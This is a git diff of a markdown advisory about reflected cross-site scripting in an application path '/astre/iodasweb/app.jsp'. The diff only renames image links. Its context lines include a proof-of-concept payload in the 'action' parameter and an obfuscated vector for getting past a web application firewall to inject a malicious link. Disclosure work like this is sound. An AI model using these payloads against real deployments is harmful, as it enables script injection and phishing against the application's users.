@@ -23,10 +23,10 @@ A vulnerability pertaining to **Reflected Cross-Site Scripting (XSS)** has been 
 ```html
 WEBSITE.COM/astre/iodasweb/app.jsp?action=<img src=x onerror=alert(1)>
 ```
-![Alt Text](images/1.png)
-![Alt Text](images/2.png)
-![Alt Text](images/3.png)
-![Alt Text](images/4.png)
+![Alt Text](1.png)
+![Alt Text](2.png)
+![Alt Text](3.png)
+![Alt Text](4.png)
 ### 🕵️ Obfuscated Payload
 
 In other versions of the application, the WAF may block the standard payload. However, it's still possible to inject HTML containing a malicious link using the following obfuscated vector:
@@ -34,8 +34,8 @@ In other versions of the application, the WAF may block the standard payload. Ho
 ```html
 WEBSITE.COM/astre/iodasweb/app.jsp?action=<image/src=\\YOUR-LINK-WITHOUT-HTTP>
 ```
-![Alt Text](images/5.png)
-![Alt Text](images/6.png)
+![Alt Text](5.png)
+![Alt Text](6.png)
 
 ---
 
